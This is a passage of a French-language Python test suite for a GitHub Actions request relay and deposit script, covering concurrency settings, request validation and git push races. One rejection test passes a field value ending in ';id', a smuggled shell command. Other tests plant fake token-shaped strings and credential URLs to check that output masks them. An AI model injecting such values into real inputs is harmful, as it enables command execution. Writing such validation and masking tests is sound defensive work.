                 ["a places 3+4", "b places 1+18"], "1" if w_hl <= 2 else None),
                ("Q4 une fenêtre qui tourne après la place 18 (16+5)", ["a places 16+5"], "3" if w_hl <= M - 5 else None),
                ("Q5 la certification de nuit (places 1+15)", ["Certifier la version places 1+15"], "16"),
                # D-2 de Cowork (20-11-2026) : « 08 » se lirait en octal et arrêterait le compte de TOUS les titres :
                # un titre à zéro de tête est ignoré, le suivant compte
                ("Q9 un titre « places 08+3 » ignoré, le suivant (1+2) compté", ["a places 08+3", "b places 1+2"],
                 "3" if w_hl <= 2 else None),
                ("Q6 des épreuves en attente (places 1+2) et une série en cours (3+2)",
                 ["Epreuves longues d'un tenant places 1+2", "Series longues de sabotages places 3+2"],
                 "5" if w_hl <= M - 4 else None)):
            attendue = attendu_premiere(titres, w_hl)
            if a_la_main is not None and attendue != a_la_main:
                faux.append(f"{nom} : l'oracle rend {attendue}, la valeur écrite à la main {a_la_main}")
            accepte(nom, attendue, hl, *relayer("main", [(NOM, DHL)], en_cours=json.dumps(
                {os.path.basename(F.CIRCUIT_SERIES): [passage(x) for x in titres]})))
        # Q8 : les titres sont lus dans les TROIS circuits (une demande d'épreuves voit la série en cours)
        if len(table.get("epreuves_longues") or {}) >= 1:
            code0 = list(table["epreuves_longues"])[0]
            accepte("Q8 épreuves pendant une série (1+10) et une certification (11+3)",
                    attendu_premiere(["s places 1+10", "c places 11+3"], 1), "1",
                    *relayer("main", [(NOM, f"circuit=epreuve\nepreuves={code0}\n".encode())], en_cours=json.dumps(
                        {os.path.basename(F.CIRCUIT_SERIES): [passage("s places 1+10")],
                         os.path.basename(F.CIRCUIT_CERTIFICATION): [passage("c places 11+3", "queued")]})))
        # Q5bis : le titre de la certification porte ses places, même lancée à l'heure (sans entrée) : ses tranches
        # occupent toujours les places 1 … TRANCHES_DE_LA_NUIT
        if (f'\nrun-name: "Certifier la version {F.TITRE_DU_PASSAGE} places 1+{F.TRANCHES_DE_LA_NUIT}"\n'
                not in (F.CERTIFICATION or "")):
            faux.append("Q5bis le titre de la certification ne dit pas ses places")
        # Q7 : la propriété du réservoir dans le fabricant — chaque fiche longue est une fiche du réservoir
        for g in (F.SERIES, F.EPREUVES, F.CERTIFICATION):
            if F.largeur_d_une_fiche(g or "")[0] != F.RESERVOIR_DES_PLACES:
                faux.append("Q7 une fiche longue n'est pas une fiche du réservoir des places")
        # (tour 3, C3 de Cowork) une demande d'exactement 1 000 octets passe
        mille = b"circuit=series\nversion=main\nserie=HL\n"
        mille += b"#" * (1000 - len(mille) - 1) + b"\n"
        c, o, appels = relayer("main", [(NOM, mille)])
        if len(mille) != 1000 or c != 0 or len(lances(appels)) != 1:
            faux.append(f"V6 demande de 1000 octets : longueur {len(mille)}, code {c}, {len(lances(appels))} lancement(s) : {o[-150:]}")
        # G (tour 3, N5, N6, N7 de Cowork) : les réglages du GABARIT du relais, que l'empreinte ne garde pas (elle dit
        # seulement « publié = fabriqué ») : déclencheur unique sur demandes/, machine de GitHub, clonage à deux commits
        # sans jeton gardé, et gh employé seulement pour « run list » et « workflow run »
        for nom, motif in (("G1 déclencheurs : push sur demandes/ et le bouton, rien d'autre",
                            r'\non:\n  push:\n    paths:\n      - "demandes/\*\*"\n  workflow_dispatch:\nconcurrency:'),
                           ("G5 groupe FIXE commun, en file (A-896)", r"\nconcurrency:\n  group: "
                            + re.escape(F.GROUPE_DU_RELAIS) + r"\n  cancel-in-progress: false\n  queue: max\npermissions:"),
                           ("G2 machine de GitHub", r"\n    runs-on: ubuntu-latest\n"),
                           ("G3 clonage à deux commits, sans jeton gardé", r"\n          fetch-depth: 2\n          persist-credentials: false\n")):
            if len(re.findall(motif, F.RELAIS)) != 1:
                faux.append(f"{nom} : le gabarit du relais ne porte plus ce réglage")
        # T1d (25-11-2026, point T1 du RELU) : le groupe du relais n'est PAS celui des relais anciens encore publiés.
        # LE TÉMOIN (R-732, une vraie ligne) : le bloc « concurrency: » de .github/workflows/demande_de_serie.yml sur la
        # branche publique travail-t54, relevé par le relecteur le 18-11-2026 (« group: demande-de-serie |
        # cancel-in-progress: false | », sans queue) ; recopié ici VOLONTAIREMENT : c'est la référence fixe.
        if F.GROUPE_DU_RELAIS == ANCIEN_GROUPE_DU_RELAIS or ("\n  group: " + ANCIEN_GROUPE_DU_RELAIS + "\n") in F.RELAIS:
            faux.append(f"T1d le relais fabriqué porte le groupe des relais anciens ({ANCIEN_GROUPE_DU_RELAIS}) : un ancien "
                        "relais sans « queue: max » y annulerait en silence une demande en attente")
        usages = sorted(set(re.findall(r"\bgh ([a-z]+ [a-z]+)", F.RELAIS)))
        if usages != ["run list", "workflow run"] or len(re.findall(r"runs-on:", F.RELAIS)) != 1:
            faux.append(f"G4 gh employé autrement que « run list » et « workflow run », ou plus d'un job : {usages}")
        # le relais est dans la famille JAMAIS_ATTENDRE de la largeur : son groupe fixe se compte (refus_de_la_largeur)
        refus_l, _ = F.refus_de_la_largeur({os.path.basename(F.CIRCUIT_RELAIS): F.RELAIS})
        if refus_l:
            faux.append(f"G6 le relais fabriqué refusé par la largeur : {refus_l}")
        # E : l'examen de certification à la demande (décision de Jean-Luc du 08-11-2026 à 18h06, « Ok vas y ») — une
        # ligne de plus dans CIRCUITS_DU_RELAIS ; la valeur « circuit=examen » doit arriver au bouton de l'examen, et à
        # lui seul, depuis main seulement, sans réglage
        certification = os.path.basename(F.CIRCUIT_CERTIFICATION)
        on_cert = F.CERTIFICATION.split("\non:\n", 1)[1].split("\nconcurrency:", 1)[0] if "\non:\n" in F.CERTIFICATION else ""
        if not re.search(r"^  workflow_dispatch:", on_cert, re.M) or re.search(r"required: true", on_cert):
            faux.append("E0 le circuit de certification n'a pas de bouton sans entrée obligatoire")
        for nom, demande, a_blanc in (("E1 examen sur main", b"circuit=examen\n", False),
                                      ("E2 examen à blanc", b"a_blanc=oui\ncircuit=examen\n", True)):
            c, o, appels = relayer("main", [(NOM, demande)])
            attendus = [] if a_blanc else [["workflow", "run", certification, "--ref", "main", "-f", "premiere_place=1",
                                            "-f", f"nombre_de_places={F.TRANCHES_DE_LA_NUIT}"]]
            listes = [x["args"][2:4] for x in appels if x["args"][:2] == ["run", "list"]]
            # fusion du 25-11-2026 : chaque lancement finit par « -f demande=<identifiant> », retiré avant la comparaison
            vus = [x["args"][:-2] for x in lances(appels)]
            if (c != 0 or vus != attendus or listes != [["--workflow", w] for w in LONGS]
                    or any(x["args"][-1] != f"demande=DEMANDE_{HEURE}@main" for x in lances(appels))):
                faux.append(f"{nom} : code {c}, lancements {[x['args'] for x in lances(appels)]}, run list {listes} : {o[-200:]}")
        refus("E3 examen depuis une version en attente", "ne se lance pas depuis",
              *relayer("travail-essai", [(NOM, b"circuit=examen\n")]))
        refus("E4 examen avec un réglage de série", "aucun reglage", *relayer("main", [(NOM, b"circuit=examen\nserie=HL\n")]))
        refus("E8 examen avec une pointe (A-811)", "aucun reglage",
              *relayer("main", [(NOM, b"circuit=examen\npointe=1c5302a94959b9702e41bb49b13c7a5220a6da43\n")]))
        # E5 (étape FILE-2) : un examen pendant un examen en attente n'est pas refusé ; ses tranches gardent leurs places
        # (la tranche k sur la place k), il part à la place 1 et attend derrière l'autre (groupe de la certification)
        accepte("E5 examen pendant un examen en attente", "1", str(F.TRANCHES_DE_LA_NUIT),
                *relayer("main", [(NOM, b"circuit=examen\n")], en_cours=json.dumps(
                    {certification: [{"status": "queued", "displayTitle": "Certifier la version places 1+15"}]})))
        refus("E6 circuit inconnu", "circuit inconnu", *relayer("main", [(NOM, b"circuit=nuit\n")]))
        refus("E7 circuit absent", "circuit manque", *relayer("main", [(NOM, b"serie=HL\n")], circuit=False))
        # X : les épreuves longues d'un tenant (étape GHUB ②, 15-11-2026, A-809, A-811, A-816) — « circuit=epreuve » :
        # la liste de codes de la demande arrive telle quelle à l'entrée « epreuves » du bouton, puis à la matrice ; le
        # compte des passages en cours porte sur les DEUX circuits du groupe des machines longues
        epreuves = os.path.basename(F.CIRCUIT_EPREUVES)
        series_yml = os.path.basename(F.CIRCUIT_SERIES)
        codes = list(table.get("epreuves_longues") or {})
        env_mx, script_mx = pas_du_gabarit(F.EPREUVES or "", "matrice")
        p_ = "1c5302a94959b9702e41bb49b13c7a5220a6da43"
        if len(codes) < 2 or env_mx is None:
            faux.append(f"X0 la table n'a pas deux épreuves longues, ou le pas matrice du circuit des épreuves manque : {codes}")
        else:
            for nom, branche, demande, liste, pointe, a_blanc in (
                    ("X1 deux épreuves, version en attente", "travail-essai",
                     f"circuit=epreuve\nepreuves={codes[1]},{codes[0]}\npointe={p_}\n", f"{codes[1]},{codes[0]}", p_, False),
                    ("X2 toutes, sur main sans pointe", "main", "epreuves=toutes\ncircuit=epreuve\n", "toutes", "", False),
                    ("X3 à blanc", "main", f"circuit=epreuve\nepreuves={codes[0]}\na_blanc=oui\n", codes[0], "", True)):
                c, o, appels = relayer(branche, [(NOM, demande.encode())])
                attendus = [] if a_blanc else [["workflow", "run", epreuves, "--ref", branche, "-f", f"version={branche}",
                                                "-f", f"pointe={pointe}", "-f", f"epreuves={liste}", "-f", "premiere_place=1",
                                                "-f", f"nombre_de_places={len(codes) if liste == 'toutes' else len(liste.split(','))}"]]
                listes = [x["args"][2:4] for x in appels if x["args"][:2] == ["run", "list"]]
                vus = [x["args"][:-2] for x in lances(appels)]   # sans « -f demande=… » (fusion du 25-11-2026)
                if c != 0 or vus != attendus or sorted(listes) != sorted([["--workflow", w] for w in LONGS]):
                    faux.append(f"{nom} : code {c}, lancements {[x['args'] for x in lances(appels)]}, run list {listes} : "
                                f"{o[-200:]}")
                    continue
                if a_blanc:
                    continue
                # la liste du bouton → le pas « Fabriquer la matrice » du circuit des épreuves → la matrice
                rt = tempfile.mkdtemp(prefix="rt_matrice_epreuves_", dir=d)
                sortie = os.path.join(rt, "sortie")
                env = dict(GIT_ENV, PATH=outils + os.pathsep + os.environ["PATH"], GITHUB_OUTPUT=sortie, RUNNER_TEMP=rt,
                           **resoudre(env_mx, {"inputs.epreuves": liste, "inputs.premiere_place": "1"}))
                c, o = lancer(["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", "-c", script_mx], env=env,
                              cwd=version)
                lu = dict(l.split("=", 1) for l in open(sortie, encoding="utf-8").read().split("\n") if "=" in l) \
                    if os.path.exists(sortie) else {}
                vus = [x.get("code") for x in json.loads(lu.get("matrice", "[]"))]
                if c != 0 or vus != (codes if liste == "toutes" else liste.split(",")):
                    faux.append(f"{nom} : matrice {vus}, code {c} : {o[-200:]}")
            for nom, attendu, branche, demande in (
                    ("X4 épreuve inconnue", "epreuve inconnue", "main", "circuit=epreuve\nepreuves=Inconnue\n"),
                    ("X5 épreuve demandée deux fois", "deux fois", "main",
                     f"circuit=epreuve\nepreuves={codes[0]},{codes[0]}\n"),
                    ("X6 version en attente sans pointe", "pointe manque", "travail-essai",
                     f"circuit=epreuve\nepreuves={codes[0]}\n"),
                    ("X7 épreuve avec un réglage de série", "ne prend que", "main",
                     f"circuit=epreuve\nepreuves={codes[0]}\nserie=HL\n"),
                    ("X8 série avec une liste d'épreuves", "ne vaut que", "main", f"serie=HL\nepreuves={codes[0]}\n"),
                    ("X11 liste avec un point-virgule", "codes separes", "main",
                     f"circuit=epreuve\nepreuves={codes[0]};id\n"),
                    ("X12 clé epreuves absente", "epreuves manque", "main", "circuit=epreuve\n"),
                    ("X13 liste donnée deux fois", "deux fois", "main",
                     f"circuit=epreuve\nepreuves={codes[0]}\nepreuves={codes[1]}\n")):
                refus(nom, attendu, *relayer(branche, [(NOM, demande.encode())]))
        # X9, X10 (étape FILE-2) : un passage de l'AUTRE circuit long : la demande part, sur les places libres
        if len(codes) >= 1:
            accepte("X9 épreuves pendant une série en attente (places 1+4)", attendu_premiere(["s places 1+4"], 1), "1",
                    *relayer("main", [(NOM, f"circuit=epreuve\nepreuves={codes[0]}\n".encode())],
                             en_cours=json.dumps({series_yml: [{"status": "queued", "displayTitle": "s places 1+4"}]})))
            accepte("X10 série pendant des épreuves en cours (places 2+3)", attendu_premiere(["e places 2+3"], int(hl)), hl,
                    *relayer("main", [(NOM, DHL)],
                             en_cours=json.dumps({epreuves: [{"status": "in_progress", "displayTitle": "e places 2+3"}]})))
        # K (18-11-2026, A-897/A-898, troisième superviseur R-759) : la file est celle de GitHub ; le relais lance
        # aussitôt, au push comme au bouton, et refuse une fiche visée qui ne porte pas « queue: max »
        c, o, appels = relayer("main", [(NOM, b"serie=HL\n")], en_cours=json.dumps(
            {os.path.basename(F.CIRCUIT_SERIES): [{"status": "queued", "displayTitle": "x places 1+2"}]}))
        if c != 0 or [x["args"][:2] for x in appels] != [["run", "list"]] * len(LONGS) + [["workflow", "run"]]:
            faux.append(f"K1 un passage des séries en attente : le relais doit lire les trois circuits longs puis lancer "
                        f"aussitôt : code {c}, {[x['args'] for x in appels]}")
        c, o, appels = relayer("main", [(NOM, b"serie=HL\n")], evenement="workflow_dispatch")
        if c != 0 or len(lances(appels)) != 1 or lances(appels)[0]["args"][-1] != f"demande=DEMANDE_{HEURE}@main":
            faux.append(f"K2 au bouton, la demande du dernier commit : code {c}, {[x['args'] for x in appels]} : {o[-200:]}")
        refus("K3 au bouton sur un commit de code", "nom refuse",
              *relayer("main", [("programmes/X.py", b"x = 1\n")], evenement="workflow_dispatch"))
        serie_f = F.SERIES
        if serie_f.count("\n  queue: max\n") != 1:
            faux.append("K0 la fiche des séries ne porte pas une fois « queue: max »")
        sans_file = serie_f.replace("\n  queue: max\n", "\n", 1)
        refus("K4 fiche visée sans queue: max", "queue: max",
              *relayer("main", [(NOM, b"serie=HL\n")], fiches=dict(FICHES, **{F.CIRCUIT_SERIES: sans_file})))
        ailleurs = sans_file.replace("\npermissions:\n", "\npermissions:\n  queue: max\n", 1)
        refus("K5 queue: max écrit hors de concurrency:", "queue: max",
              *relayer("main", [(NOM, b"serie=HL\n")], fiches=dict(FICHES, **{F.CIRCUIT_SERIES: ailleurs})))
        refus("K6 fiche visée absente de la branche", "absente",
              *relayer("main", [(NOM, b"serie=HL\n")],
                       fiches={k: v for k, v in FICHES.items() if k != F.CIRCUIT_SERIES}))
        # K10 (T4 du RELU du 18-11-2026, mesuré par le relecteur sur une variante) : « queue: max » ET
        # « cancel-in-progress: true » annulerait le passage EN COURS du groupe
        annule = serie_f.replace("\n  cancel-in-progress: false\n  queue: max\n", "\n  cancel-in-progress: true\n  queue: max\n", 1)
        if annule == serie_f:
            faux.append("K10 la fiche des séries n'a plus le bloc attendu (« cancel-in-progress: false » puis « queue: max »)")
        refus("K10 fiche visée à cancel-in-progress: true", "n'est pas une file",
              *relayer("main", [(NOM, b"serie=HL\n")], fiches=dict(FICHES, **{F.CIRCUIT_SERIES: annule})))
        # K11 (E2 du RELU du 25-11-2026) : toute valeur de « cancel-in-progress » autre que « false » exact est refusée ;
        # GitHub lit « ${{ true }} » comme vrai (les majuscules : THÉORIQUE), une telle fiche annulerait le passage en cours
        for valeur in ("True", "${{ true }}", "yes"):
            autre = serie_f.replace("\n  cancel-in-progress: false\n  queue: max\n",
                                    f"\n  cancel-in-progress: {valeur}\n  queue: max\n", 1)
            refus(f"K11 fiche visée à cancel-in-progress: {valeur}", "n'est pas une file",
                  *relayer("main", [(NOM, b"serie=HL\n")], fiches=dict(FICHES, **{F.CIRCUIT_SERIES: autre})))
        # T1a à T1c (25-11-2026, point T1 du RELU) : le relais DE LA BRANCHE doit être une file du groupe GROUPE_DU_RELAIS.
        # T1a : le relais ancien tel que publié (bloc du témoin ANCIEN_GROUPE_DU_RELAIS, sans « queue: max »)
        bloc_neuf = f"\nconcurrency:\n  group: {F.GROUPE_DU_RELAIS}\n  cancel-in-progress: false\n  queue: max\n"
        if F.RELAIS.count(bloc_neuf) != 1:
            faux.append("T1 le relais fabriqué n'a pas une fois le bloc de file attendu")
        for nom, bloc in (
                ("T1a relais ancien sur la branche (groupe ancien, sans queue: max)",
                 f"\nconcurrency:\n  group: {ANCIEN_GROUPE_DU_RELAIS}\n  cancel-in-progress: false\n"),
                ("T1b relais en file sous le nom ancien",
                 f"\nconcurrency:\n  group: {ANCIEN_GROUPE_DU_RELAIS}\n  cancel-in-progress: false\n  queue: max\n"),
                ("T1c relais du groupe neuf sans queue: max",
                 f"\nconcurrency:\n  group: {F.GROUPE_DU_RELAIS}\n  cancel-in-progress: false\n")):
            refus(nom, "relais de cette branche n'est pas une file",
                  *relayer("main", [(NOM, b"serie=HL\n")],
                           fiches=dict(FICHES, **{F.CIRCUIT_RELAIS: F.RELAIS.replace(bloc_neuf, bloc, 1)})))
        c, o, appels = relayer("main", [(NOM, b"serie=HL\n")], refus_gh=True)
        if c == 0 or "LANCEMENT REFUSE PAR GITHUB" not in o:
            faux.append(f"K7 lancement refusé par GitHub : code {c} : {o[-200:]}")
        refus("K8 nom de plus de 24 h", "plus de 24", *relayer("main", [(NOM_PERIME, b"serie=HL\n")]))
        refus("K9 nom dans le futur", "futur", *relayer("main", [(NOM_FUTUR, b"serie=HL\n")]))
        refus("P37 clé version absente", "version manque", *relayer("main", [(NOM, b"serie=HL\n")], version=False))
        # D (18-11-2026) : programmes/DEPOSER_UNE_DEMANDE.py — nom à l'horloge, pointe lue au privé, examen du relais
        # joué avant la poussée, un commit d'un seul fichier dont le parent est la pointe publique
        depose = os.path.join(racine, DEPOSEUR)
        if not os.path.exists(depose):
            faux.append(f"D0 {DEPOSEUR} absent")
        else:
            prive = os.path.join(d, "prive_d")
            lancer(["git", "init", "-q", "-b", "main", prive])
            lancer(["git", "-C", prive, "commit", "-q", "--allow-empty", "-m", "v1"])
            lancer(["git", "-C", prive, "checkout", "-q", "-b", "travail-z"])
            lancer(["git", "-C", prive, "commit", "-q", "--allow-empty", "-m", "v2"])
            pointe_z = lancer(["git", "-C", prive, "rev-parse", "travail-z"])[1].strip()
            nu = os.path.join(d, "public_d.git")
            lancer(["git", "init", "-q", "--bare", nu])
            graine = os.path.join(d, "graine_d")
            lancer(["git", "init", "-q", "-b", "main", graine])
            for chemin, texte in dict(FICHES, **{F.CIRCUIT_RELAIS: F.RELAIS}).items():
                os.makedirs(os.path.dirname(os.path.join(graine, chemin)), exist_ok=True)
                open(os.path.join(graine, chemin), "w", encoding="utf-8").write(texte)
            lancer(["git", "-C", graine, "add", "-A"])
            lancer(["git", "-C", graine, "commit", "-q", "-m", "base"])
            lancer(["git", "-C", graine, "push", "-q", nu, "main:main", "main:travail-z"])
            # D9 (25-11-2026, T1 ②) : une branche publique travail-y dont le relais est l'ANCIEN (bloc du témoin)
            lancer(["git", "-C", graine, "checkout", "-q", "-b", "travail-y"])
            open(os.path.join(graine, F.CIRCUIT_RELAIS), "w", encoding="utf-8").write(F.RELAIS.replace(
                f"\n  group: {F.GROUPE_DU_RELAIS}\n  cancel-in-progress: false\n  queue: max\n",
                f"\n  group: {ANCIEN_GROUPE_DU_RELAIS}\n  cancel-in-progress: false\n", 1))
            lancer(["git", "-C", graine, "commit", "-q", "-am", "relais ancien"])
            lancer(["git", "-C", graine, "push", "-q", nu, "travail-y:travail-y"])
            lancer(["git", "-C", prive, "branch", "-q", "travail-y", "travail-z"])
            clone_d = os.path.join(d, "clone_d")
            lancer(["git", "clone", "-q", nu, clone_d])

            def deposer(*args):
                """Lance le programme de dépôt sur le clone d'essai ; rend (code, sortie).

                ① RÔLE — Un lancement du programme éprouvé. ② CONTEXTE D'APPEL — `tour`, cas D.
                ③ ENTRÉE — `args` : branche et réglages. ④ CONDITIONS D'ENTRÉE — —
                ⑤ SORTIE — DEUX valeurs : code, sortie. [rend: 2] ⑥ TRAITEMENT — python3 -B, --prive= le dépôt d'essai.
                ⑦ UNITÉ — — ⑧ POURQUOI — — ⑨ CE QUI CLOCHE — — ⑩ EFFET — Peut pousser au dépôt nu d'essai.
                ⑪ TERMINAISON — Rend la main. [sort: non]
                """
                return lancer([sys.executable, "-B", depose, clone_d] + list(args) + ["--prive=" + prive])

            def pointe_publique(branche):
                """Rend la pointe d'une branche du dépôt nu d'essai.

                ① RÔLE — Voir ce qui a été poussé. ② CONTEXTE D'APPEL — `tour`, cas D. ③ ENTRÉE — `branche`.
                ④ CONDITIONS D'ENTRÉE — — ⑤ SORTIE — UNE valeur : le commit. [rend: 1] ⑥ TRAITEMENT — rev-parse.
                ⑦ UNITÉ — — ⑧ POURQUOI — — ⑨ CE QUI CLOCHE — — ⑩ EFFET — Aucun. ⑪ TERMINAISON — Rend la main.
                [sort: non]
                """
                return lancer(["git", "-C", nu, "rev-parse", branche])[1].strip()

            avant_z = pointe_publique("travail-z")
            c, o = deposer("travail-z", "circuit=series", "serie=HL", "--pousser")
            apres_z = pointe_publique("travail-z")
            m = re.search(r"DEPOSEE : DEMANDE_(" + F.HEURE_DE_DEMANDE + r")@travail-z$", o.strip())
            if c != 0 or not m:
                faux.append(f"D1 dépôt d'une série sur une version en attente : code {c} : {o[-300:]}")
            else:
                nom_d = f"demandes/DEMANDE_{m.group(1)}.txt"
                changes = lancer(["git", "-C", nu, "diff-tree", "--no-commit-id", "-r", "--name-status", avant_z,
                                  apres_z])[1].strip().split("\n")
                parent = lancer(["git", "-C", nu, "rev-parse", apres_z + "^1"])[1].strip()
                texte = lancer(["git", "-C", nu, "show", f"{apres_z}:{nom_d}"])[1]
                if (changes != ["A\t" + nom_d] or parent != avant_z
                        or texte != f"circuit=series\nversion=travail-z\npointe={pointe_z}\nserie=HL\n"):
                    faux.append(f"D1 commit déposé : changements {changes}, parent {parent == avant_z}, texte {texte!r}")
                # D2 : le relais, sur la branche après la poussée, examine la demande déposée et la lance
                r2 = os.path.join(d, "relais_d")
                lancer(["git", "clone", "-q", "-b", "travail-z", nu, r2])
                c2, o2, ap2 = jouer_le_relais(r2, avant_z, apres_z, "travail-z", "push")
                if c2 != 0 or [x["args"][-1] for x in lances(ap2)] != [f"demande=DEMANDE_{m.group(1)}@travail-z"]:
                    faux.append(f"D2 la demande déposée n'est pas lancée par le relais : code {c2} : {o2[-300:]}")
            for nom, args, raison in (
                    ("D3 clé inconnue : refusée par l'examen du relais, rien poussé",
                     ("main", "circuit=series", "serie=HL", "couleur=rouge", "--pousser"), "cle inconnue"),
                    ("D4 pointe donnée à la main : refusée", ("main", "circuit=series", "serie=HL",
                                                              "pointe=" + "a" * 40, "--pousser"), "pointe n'est pas"),
                    ("D5 version donnée à la main : refusée", ("main", "circuit=examen", "version=main", "--pousser"),
                     "version n'est pas"),
                    ("D6 examen avec un réglage de série : refusé par l'examen du relais",
                     ("main", "circuit=examen", "serie=HL", "--pousser"), "aucun reglage"),
                    ("D7 série inconnue : refusée par l'examen du relais",
                     ("main", "circuit=series", "serie=Inconnue", "--pousser"), "serie inconnue")):
                avant_m = pointe_publique("main")
                c, o = deposer(*args)
                if c != 1 or raison not in o or pointe_publique("main") != avant_m:
                    faux.append(f"{nom} : code {c}, poussé {pointe_publique('main') != avant_m} : {o[-300:]}")
            avant_y = pointe_publique("travail-y")
            c, o = deposer("travail-y", "circuit=series", "serie=HL", "--pousser")
            if c != 1 or "relais de cette branche n'est pas une file" not in o or pointe_publique("travail-y") != avant_y:
                faux.append(f"D9 dépôt sur une branche au relais ancien : code {c}, poussé "
                            f"{pointe_publique('travail-y') != avant_y} : {o[-300:]}")
            # D10 (25-11-2026, T5 du RELU, partie sans décision) : une poussée refusée par un crochet du clone, alors que la
            # branche n'a pas avancé, n'est PAS une course : le refus s'affiche en entier, une seule fois, code 2, rien poussé
            crochet = os.path.join(clone_d, ".git", "hooks", "pre-push")
            # le refus porte aussi deux accès FACTICES (fabriqués ici, jamais un vrai) : une adresse « https://<accès>@ »
            # sans préfixe de jeton, et une chaîne de la forme d'un jeton ; aucun ne doit ressortir en clair (masque)
            faux_jeton = "gh" + "p_" + "Z" * 36
            open(crochet, "w").write("#!/bin/sh\necho 'REFUS DU CROCHET D ESSAI' >&2\necho 'adresse https://ACCESFACTICE@exemple.invalid/d " + faux_jeton
                                     + "' >&2\necho '" + "x" * 300 + "' >&2\nexit 1\n")
            os.chmod(crochet, 0o755)
            avant_m = pointe_publique("main")
            c, o = deposer("main", "circuit=examen", "--pousser")
            os.remove(crochet)
            # le diagnostic nomme CHAQUE sous-condition manquée (superviseur R-759 du 25-11-2026, point 5 : la queue de la
            # sortie, noyée par les 300 « x » du crochet, ne disait pas laquelle) ; aucune sortie recopiée (accès factices)
            manque = [n for n, ko in (
                (f"code {c} au lieu de 2", c != 2),
                ("motif du crochet absent", "REFUS DU CROCHET D ESSAI" not in o),
                (f"{o.count('poussée refusée (essai')} essai(s) au lieu de 1", o.count("poussée refusée (essai") != 1),
                ("« n'a pas avancé » absent", "n'a pas avancé" not in o),
                ("poussé au public", pointe_publique("main") != avant_m),
                ("adresse à accès en clair", "ACCESFACTICE" in o),
                ("forme de jeton en clair", faux_jeton in o),
                ("adresse masquée absente", "https://***@exemple.invalid" not in o)) if ko]
            if manque:
                faux.append("D10 refus du crochet : " + " ; ".join(manque))
            # D11 (25-11-2026, superviseur R-759 point 4 : la branche « code 2 » sans sabotage propre) : le module du
            # masque illisible (copie du programme SANS programmes/FORME_D_UN_JETON.py) → rien de conclu, code 2, le refus
            # n'est PAS affiché (il pourrait montrer un accès), rien poussé
            sans = os.path.join(d, "sans_masque")
            for f_ in (FABRICANT, TABLE, JOUEUR, RASSEMBLEUR, JOUEUR_D_EPREUVE, DEPOSEUR):
                os.makedirs(os.path.dirname(os.path.join(sans, f_)), exist_ok=True)
                shutil.copyfile(os.path.join(racine, f_), os.path.join(sans, f_))
            open(crochet, "w").write("#!/bin/sh\necho 'REFUS DU CROCHET D ESSAI https://ACCESFACTICE@exemple.invalid/d' >&2\nexit 1\n")
            os.chmod(crochet, 0o755)
            avant_m = pointe_publique("main")
            c, o = lancer([sys.executable, "-B", os.path.join(sans, DEPOSEUR), clone_d, "main", "circuit=examen",
                           "--pousser", "--prive=" + prive])
            os.remove(crochet)
            manque = [n for n, ko in (
                (f"code {c} au lieu de 2", c != 2),
                ("« masque des accès illisible » absent", "masque des accès illisible" not in o),
                ("refus affiché sans masque", "REFUS DU CROCHET" in o or "ACCESFACTICE" in o),
                ("poussé au public", pointe_publique("main") != avant_m)) if ko]
            if manque:
                faux.append("D11 masque illisible : " + " ; ".join(manque))
            # D12 (C1 du RELU du 25-11-2026) : une COURSE PERDUE. Le crochet, à son premier passage, pousse un commit
            # intrus sur la branche du dépôt nu, s'efface et refuse : la branche a avancé, DEPOSER doit retenter et
            # déposer au-dessus de l'intrus. Branche à elle (travail-course) : une demande déposée sur main ferait
            # attendre la minute suivante au dépôt de D8.
            lancer(["git", "-C", nu, "branch", "-q", "travail-course", "main"])
            lancer(["git", "-C", prive, "branch", "-q", "travail-course", "travail-z"])   # circuit examen : main seule
            trace = os.path.join(d, "intrus")
            open(crochet, "w").write(
                "#!/bin/sh\nNU='" + nu + "'\n"
                "TIP=$(git --git-dir=\"$NU\" rev-parse refs/heads/travail-course) || exit 3\n"
                "NEW=$(git -c user.name=essai -c user.email=essai@exemple.invalid --git-dir=\"$NU\" commit-tree "
                "\"$TIP^{tree}\" -p \"$TIP\" -m intrus) || exit 3\n"
                "git --git-dir=\"$NU\" update-ref refs/heads/travail-course \"$NEW\" \"$TIP\" || exit 3\n"
                "echo \"$NEW\" > '" + trace + "'\nrm -f \"$0\"\necho 'REFUS DE COURSE' >&2\nexit 1\n")
            os.chmod(crochet, 0o755)
            c, o = deposer("travail-course", "circuit=series", "serie=HL", "--pousser")
            if os.path.exists(crochet):
                os.remove(crochet)
            intrus = open(trace).read().strip() if os.path.exists(trace) else ""
            apres = pointe_publique("travail-course")
            parent = lancer(["git", "-C", nu, "rev-parse", apres + "^1"])[1].strip() if intrus else ""
            manque = [n for n, ko in (
                (f"code {c} au lieu de 0", c != 0),
                ("intrus non poussé par le crochet", not intrus),
                (f"{o.count('poussée refusée (essai')} refus affiché(s) au lieu de 1", o.count("poussée refusée (essai") != 1),
                ("« DEPOSEE » absent", "DEPOSEE : DEMANDE_" not in o),
                ("la demande n'est pas au-dessus de l'intrus", bool(intrus) and parent != intrus)) if ko]
            if manque:
                faux.append("D12 course perdue : " + " ; ".join(manque))
            # D13 (C4 du RELU du 25-11-2026) : une poussée SANS RÉPONSE dans le délai (crochet qui dort 4 s, délai réduit
            # à 2 s) a pu aboutir : code 2, et le dire ; jamais code 1 (« refusée, rien n'est poussé »).
            lancer(["git", "-C", nu, "branch", "-q", "travail-lent", "main"])
            lancer(["git", "-C", prive, "branch", "-q", "travail-lent", "travail-z"])
            open(crochet, "w").write("#!/bin/sh\nsleep 4\nexit 0\n")
            os.chmod(crochet, 0o755)
            c, o = lancer([sys.executable, "-B", depose, clone_d, "travail-lent", "circuit=series", "serie=HL", "--pousser",
                           "--prive=" + prive], env=dict(GIT_ENV, DEPOSER_DELAI_DE_GIT_EN_SECONDES="2"))
            os.remove(crochet)
            manque = [n for n, ko in (
                (f"code {c} au lieu de 2", c != 2),
                ("« PU aboutir » absent", "PU aboutir" not in o)) if ko]
            if manque:
                faux.append("D13 poussée sans réponse : " + " ; ".join(manque))
            # D14 (N3 du RELU du 25-11-2026) : après un refus, la branche ne se lit plus (le crochet rend l'adresse de
            # « origin » fausse) : rien ne dit si c'est une course → code 2, rien retenté, rien poussé.
            adresse = lancer(["git", "-C", clone_d, "config", "remote.origin.url"])[1].strip()
            open(crochet, "w").write("#!/bin/sh\ngit config remote.origin.url '" + os.path.join(d, "absent")
                                     + "'\necho 'REFUS AVANT PANNE' >&2\nexit 1\n")
            os.chmod(crochet, 0o755)
            avant_m = pointe_publique("main")
            c, o = deposer("main", "circuit=examen", "--pousser")
            os.remove(crochet)
            lancer(["git", "-C", clone_d, "config", "remote.origin.url", adresse])
